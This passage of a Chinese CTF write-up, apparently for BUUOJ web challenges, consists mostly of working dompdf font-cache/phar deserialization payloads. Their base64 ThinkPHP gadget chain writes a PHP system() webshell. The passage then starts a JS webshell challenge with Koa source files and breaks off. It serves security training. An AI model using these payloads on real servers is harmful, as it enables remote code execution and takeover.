pOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319fXM6MTE6IgAqAGJpbmRBdHRyIjthOjI6e2k6MDtzOjI6Im5vIjtpOjE7czozOiIxMjMiO319czo5OiIAKgBwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NjY6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgkX0dFVFswXSk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljL3NoZWxsLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fXM6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjY2OiJlY2hvICc8P3BocCBzeXN0ZW0oJF9HRVRbMF0pOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy9zaGVsbC5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19fX19CAAAAHRlc3QudHh0BAAAABjfRGQEAAAADH5%252F2KQBAAAAAAAAdGVzdBWB9f6JQIYyI1I%252FrlGvbBPrRjFfAgAAAEdCTUI%253D');+font-weight:'normal';+font-style:'normal';}</style>

====== REQUEST 2 ENCODED =======

<style>@font-face+{+font-family:'exploit';+src:url('phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_6462e1126807db7635fd4c3c9542f65a.ttf%23%23');+font-weight:'normal';+font-style:'normal';}</style>

====== REQUEST 1 NOT ENCODED =======

<style>
    @font-face {
        font-family:'exploit';
        src:url('data:text/plain;base64,AAEAAAANAIAAAwBQRkZUTaDC72QAAAVwAAAAHE9TLzJVeV76AAABWAAAAGBjbWFwAA0DlgAAAcQAAAE6Y3Z0IAAhAnkAAAMAAAAABGdhc3D%252F%252FwADAAAFaAAAAAhnbHlmPaWWPgAAAwwAAABUaGVhZCE%252BTW0AAADcAAAANmhoZWEEIAAAAAABFAAAACRobXR4ArkAIQAAAbgAAAAMbG9jYQAqAFQAAAMEAAAACG1heHAARwA5AAABOAAAACBuYW1lpiMmRgAAA2AAAAHjcG9zdP%252B3ADIAAAVEAAAAIgABAAAAAQAAj5SJa18PPPUACwPoAAAAAOBqhPcAAAAA4GqE9wAhAAABKgKaAAAACAACAAAAAAAAAAEAAAKaAAAAWgAAAAD%252F%252FwEqAAEAAAAAAAAAAAAAAAAAAAAAAAEAAAADAAgAAgAAAAAAAgAAAAEAAQAAAEAALgAAAAAABAH0AZAABQAAAooCvAAAAIwCigK8AAAB4AAxAQIAAAIABQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUGZFZACA%252F%252F8AAAMg%252FzgAWgKaAAAAAAABAAAAAAAAAAAAAAAgAAEBbAAhAAAAAAFNAAAAAAADAAAAAwAAABwAAQAAAAAANAADAAEAAAAcAAQAGAAAAAIAAgAAAAD%252F%252FwAA%252F%252F8AAQAAAAABBgAAAQAAAAAAAAABAgAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACECeQAAACoAKgAqAAIAIQAAASoCmgADAAcALrEBAC88sgcEAO0ysQYF3DyyAwIA7TIAsQMALzyyBQQA7TKyBwYB%252FDyyAQIA7TIzESERJzMRIyEBCejHxwKa%252FWYhAlgAAAAADgCuAAEAAAAAAAAACgAWAAEAAAAAAAEACQA1AAEAAAAAAAIABwBPAAEAAAAAAAMAJQCjAAEAAAAAAAQACQDdAAEAAAAAAAUADwEHAAEAAAAAAAYACQErAAMAAQQJAAAAFAAAAAMAAQQJAAEAEgAhAAMAAQQJAAIADgA%252FAAMAAQQJAAMASgBXAAMAAQQJAAQAEgDJAAMAAQQJAAUAHgDnAAMAAQQJAAYAEgEXAEQAVQBNAE0AWQAgAEYATwBOAFQAAERVTU1ZIEZPTlQAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFIAZQBnAHUAbABhAHIAAFJlZ3VsYXIAAEYAbwBuAHQARgBvAHIAZwBlACAAMgAuADAAIAA6ACAAVQBuAHQAaQB0AGwAZQBkADEAIAA6ACAAMgAzAC0ANAAtADIAMAAyADMAAEZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyMy00LTIwMjMAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFYAZQByAHMAaQBvAG4AIAAwADAAMQAuADAAMAAwAABWZXJzaW9uIDAwMS4wMDAAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAAACAAAAAAAA%252F7UAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH%252F%252FwACAAAAAQAAAADf7eV1AAAAAOBqhPcAAAAA4GqE9zw%252FcGhwIF9fSEFMVF9DT01QSUxFUigpOyA%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%252FcGhwIHN5c3RlbSgkX0dFVFswXSk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljL3NoZWxsLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fXM6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjY2OiJlY2hvICc8P3BocCBzeXN0ZW0oJF9HRVRbMF0pOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy9zaGVsbC5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19fX19CAAAAHRlc3QudHh0BAAAABjfRGQEAAAADH5%252F2KQBAAAAAAAAdGVzdBWB9f6JQIYyI1I%252FrlGvbBPrRjFfAgAAAEdCTUI%253D');
        font-weight:'normal';
        font-style:'normal';
    }
</style>

====== REQUEST 2 NOT ENCODED =======

<style>
    @font-face {
        font-family:'exploit';
        src:url('phar:///var/www/html/vendor/dompdf/dompdf/lib/fonts/exploit_normal_6462e1126807db7635fd4c3c9542f65a.ttf##');
        font-weight:'normal';
        font-style:'normal';
    }
</style>
```


`http://6f1336dd-e8a9-4768-a528-4bf758a8a25e.node4.buuoj.cn:81/index.php?s=index/index/pdf`
```css
content=<style>@font-face {font-family:'exploit';src:url('data:text/plain;base64,AAEAAAANAIAAAwBQRkZUTaDC72QAAAVwAAAAHE9TLzJVeV76AAABWAAAAGBjbWFwAA0DlgAAAcQAAAE6Y3Z0IAAhAnkAAAMAAAAABGdhc3D%252F%252FwADAAAFaAAAAAhnbHlmPaWWPgAAAwwAAABUaGVhZCE%252BTW0AAADcAAAANmhoZWEEIAAAAAABFAAAACRobXR4ArkAIQAAAbgAAAAMbG9jYQAqAFQAAAMEAAAACG1heHAARwA5AAABOAAAACBuYW1lpiMmRgAAA2AAAAHjcG9zdP%252B3ADIAAAVEAAAAIgABAAAAAQAAj5SJa18PPPUACwPoAAAAAOBqhPcAAAAA4GqE9wAhAAABKgKaAAAACAACAAAAAAAAAAEAAAKaAAAAWgAAAAD%252F%252FwEqAAEAAAAAAAAAAAAAAAAAAAAAAAEAAAADAAgAAgAAAAAAAgAAAAEAAQAAAEAALgAAAAAABAH0AZAABQAAAooCvAAAAIwCigK8AAAB4AAxAQIAAAIABQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUGZFZACA%252F%252F8AAAMg%252FzgAWgKaAAAAAAABAAAAAAAAAAAAAAAgAAEBbAAhAAAAAAFNAAAAAAADAAAAAwAAABwAAQAAAAAANAADAAEAAAAcAAQAGAAAAAIAAgAAAAD%252F%252FwAA%252F%252F8AAQAAAAABBgAAAQAAAAAAAAABAgAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACECeQAAACoAKgAqAAIAIQAAASoCmgADAAcALrEBAC88sgcEAO0ysQYF3DyyAwIA7TIAsQMALzyyBQQA7TKyBwYB%252FDyyAQIA7TIzESERJzMRIyEBCejHxwKa%252FWYhAlgAAAAADgCuAAEAAAAAAAAACgAWAAEAAAAAAAEACQA1AAEAAAAAAAIABwBPAAEAAAAAAAMAJQCjAAEAAAAAAAQACQDdAAEAAAAAAAUADwEHAAEAAAAAAAYACQErAAMAAQQJAAAAFAAAAAMAAQQJAAEAEgAhAAMAAQQJAAIADgA%252FAAMAAQQJAAMASgBXAAMAAQQJAAQAEgDJAAMAAQQJAAUAHgDnAAMAAQQJAAYAEgEXAEQAVQBNAE0AWQAgAEYATwBOAFQAAERVTU1ZIEZPTlQAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFIAZQBnAHUAbABhAHIAAFJlZ3VsYXIAAEYAbwBuAHQARgBvAHIAZwBlACAAMgAuADAAIAA6ACAAVQBuAHQAaQB0AGwAZQBkADEAIAA6ACAAMgAzAC0ANAAtADIAMAAyADMAAEZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyMy00LTIwMjMAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFYAZQByAHMAaQBvAG4AIAAwADAAMQAuADAAMAAwAABWZXJzaW9uIDAwMS4wMDAAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAAACAAAAAAAA%252F7UAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH%252F%252FwACAAAAAQAAAADf7eV1AAAAAOBqhPcAAAAA4GqE9zw%252FcGhwIF9fSEFMVF9DT01QSUxFUigpOyA%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%252F2KQBAAAAAAAAdGVzdMkYHV4Z%252Fio68r7AmzNWUa1WDpAnAgAAAEdCTUI%253D');font-weight:'normal';font-style:'normal';}

content=<style>@font-face+{+font-family:'exploit';+src:url('phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_472febb29b73876cbb45fc27f7e448db.ttf%23%23');+font-weight:'normal';+font-style:'normal';}</style>
```

![](attachments/Pasted%20image%2020230423153722.png)

>这里产生的ttf文件名和脚本计算的不一样本地用docker来测试看结果
  exploit_normal_472febb29b73876cbb45fc27f7e448db.ttf

本地docker通了，但是好像实际buu环境没通

![](attachments/Pasted%20image%2020230423153745.png)


破案了，测试太多次没理清，粘错payload了

![](attachments/Pasted%20image%2020230423161427.png)

### 你听说过 js 的 webshell 吗 #JSCGI
F12 存在

![](attachments/Pasted%20image%2020230426110842.png)

首页源码提示扫描网站

![](attachments/Pasted%20image%2020230422141310.png)

app.js
```js
const Koa        = require('koa')
const bodyparser = require('koa-bodyparser')()
const static     = require('koa-static')
const cors       = require('./cors')
const template   = require('./middlewares/template')
const route      = require('./middlewares/route')
const api        = require('./middlewares/api')
const listen     = require('./middlewares/listen')
const production = process.env.NODE_ENV === 'production'
  
const app        = new Koa()
  
app
    .use(static('./'))
    .use(template('views', {
        // noCache: !production,
        // watch  : !production
    }))
    .use(bodyparser)
    .use(cors)
    .use(route)
    .use(api)
  
listen(app)
```

config.js
```js
const CONFIG = {
    server: {
        domain: 'test.example.com',
        pact: 'https',
        host: '0.0.0.0',
        port: '443',
    },
    coding: {
        username: 'test@test.com',
        password: 'IAmTheCodeMaster',
        apiKey: 'flag{This is fake flag}:-)',
    }
}
  
if (process.env.NODE_ENV === 'development') {
    CONFIG.server.pact = 'http',
    CONFIG.server.port = '80'
}
  
module.exports = CONFIG
```

package.json
```json
{
    "name": "updater",
    "version": "2.0.0",
    "description": "> v0.0.1",
    "main": "app.js",
    "dependencies": {
      "axios": "^0.21.1"
      "koa": "^2.13.0",
      "koa-bodyparser": "^4.3.0",
      "koa-router": "^9.1.0",
      "koa-sslify": "^4.0.3",
      "koa-static": "^5.0.0",
      "koa2-cors": "^2.0.6",
      "nunjucks": "^3.2.2"
    },
    "devDependencies": {
    },
    "scripts": {
      "test": "echo \"Error: no test specified\" && exit 1",
      "dev": "pm2 start ecosystem.config.js",
      "prod": "pm2 start ecosystem.config.js --env production"
    },
    "license": "ISC"
  }
```

dockerfile
```dockerfile
FROM node:16
WORKDIR /app
COPY . /app
  
RUN npm install && npm install -g pm2
  
EXPOSE 443
EXPOSE 80
CMD ["pm2-runtime", "/app/ecosystem.config.js"]
```

dockerfile中的ecosystem.config.js文件访问后
```js
// Options reference: https://pm2.keymetrics.io/docs/usage/application-declaration/
const package = require('./package.json')

module.exports = {
    apps: [{
        name               : package.name,
        script             : 'app.js',
        args               : 'one two',
        instances          : 1,
        autorestart        : true,
        watch              : true,
        ignore_watch       : ['node_modules', 'logs', '.git', 'statics'],
        error_file         : 'logs/err.log',
